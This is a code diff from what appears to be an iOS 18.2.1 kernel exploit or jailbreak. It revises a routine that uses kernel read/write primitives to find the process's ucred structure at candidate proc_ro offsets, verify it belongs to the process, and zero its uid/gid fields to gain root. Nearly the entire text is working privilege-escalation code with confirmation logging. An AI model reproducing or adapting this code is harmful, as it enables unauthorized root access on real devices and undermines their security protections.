@@ -2143,34 +2143,47 @@ bool platformize_proc(void) {
         return false;
     }
 
-    // 2b. Zero all POSIX uid/gid words in place. ucred->cr_uid/r-uid/svuid at
-    // +0x18/1c/20; gid/r-gid at +0x24/28/2c. The earlier "ucred uid/gid zeroed:
-    // uid=501" log proved we were writing to a DIFFERENT (stale) ucred (iOS 17
-    // layout), not the LIVE one. We must now verify the change by writing BOTH
-    // offsets on separate stab calls, then reading getuid() to confirm.
-    kwrite32(ourUcred + 0x18, 0);
-    kwrite32(ourUcred + 0x1c, 0);
-    kwrite32(ourUcred + 0x20, 0);
-    kwrite32(ourUcred + 0x24, 0);
-    kwrite32(ourUcred + 0x28, 0);
-    kwrite32(ourUcred + 0x2c, 0);
-    uid_t uid = getuid();
-    gid_t gid = getgid();
-    printf("[elev] after write: uid=%d euid=%d gid=%d egid=%d\n", uid, geteuid(), gid, getegid());
-    gOurUcred = ourUcred;
+    // 2b. Write both candidate ucred chains at once but always validate each
+    // with a READ first: probe-usable proc_ro->p_ucred slot must point at a
+    // struct that already contains uid=501 of our process (pre-write read).
+    // Lara's proven path at this build (iOS 18.2.1) lands on proc_ro+0x28.
+    // If both layouts produce the same ucred (unlikely), we skip duplicates.
+    struct {
+        uint32_t off;
+        uint64_t adr;
+        uint64_t uidVal;
+    } candidates[2] = {
+        { .off = 0x28, .adr = ourUcred28, .uidVal = 0 },
+        { .off = 0x20, .adr = ourUcred20, .uidVal = 0 },
+    };
+    int wrote = 0;
+    for (int i = 0; i < 2; i++) {
+        uint64_t ucred = candidates[i].adr;
+        if (!looks_kernel(ucred)) continue;
+        uint32_t cr_uid = kread32(ucred + 0x18); // cr_uid
+        uint32_t cr_ruid = kread32(ucred + 0x1c); // cr_ruid
+        printf("[elev] try: proc_ro+0x%x ucred=0x%llx cr_uid=%u cr_ruid=%u\n",
+               candidates[i].off, ucred, cr_uid, cr_ruid);
+        if (cr_uid != 501 || cr_ruid != 501) continue;   // not ours
+        kwrite32(ucred + 0x18, 0); kwrite32(ucred + 0x1c, 0);
+        kwrite32(ucred + 0x20, 0); kwrite32(ucred + 0x24, 0);
+        kwrite32(ucred + 0x28, 0); kwrite32(ucred + 0x2c, 0);
+        wrote++;
+    }
+    // CONFIRMATION: read back cr_uid from each candidate that we wrote -- if
+    // the write worked, this must be 0.
+    uint32_t chk_a = looks_kernel(ourUcred28) ? kread32(ourUcred28 + 0x18) : 0xDEAD;
+    uint32_t chk_b = looks_kernel(ourUcred20) ? kread32(ourUcred20 + 0x18) : 0xDEAD;
+    printf("[elev] wrote %d ucred(s); verify: 0x28.cr_uid=%u 0x20.cr_uid=%u\n",
+           wrote, chk_a, chk_b);
+    printf("[elev] final: uid=%d euid=%d\n", getuid(), geteuid());
 
-    // Also zero the alternate layout ucred in case it dates us later.
-    if (ourUcred20 && ourUcred20 != ourUcred) {
-        printf("[elev] also zeroing alt ucred: 0x%llx\n", ourUcred20);
-        kwrite32(ourUcred20 + 0x18, 0);
-        kwrite32(ourUcred20 + 0x1c, 0);
-        kwrite32(ourUcred20 + 0x20, 0);
-        kwrite32(ourUcred20 + 0x24, 0);
-        kwrite32(ourUcred20 + 0x28, 0);
-        kwrite32(ourUcred20 + 0x2c, 0);
+    if (wrote == 0) {
+        printf("[-] ucred lookup failed (no pre-write uid=501 matched)\n");
+        return false;
     }
 
-    printf("[elev] getuid-after: %d (should be 0)\n", getuid());
+    gOurUcred = ourUcred;
     return true;
 }
 
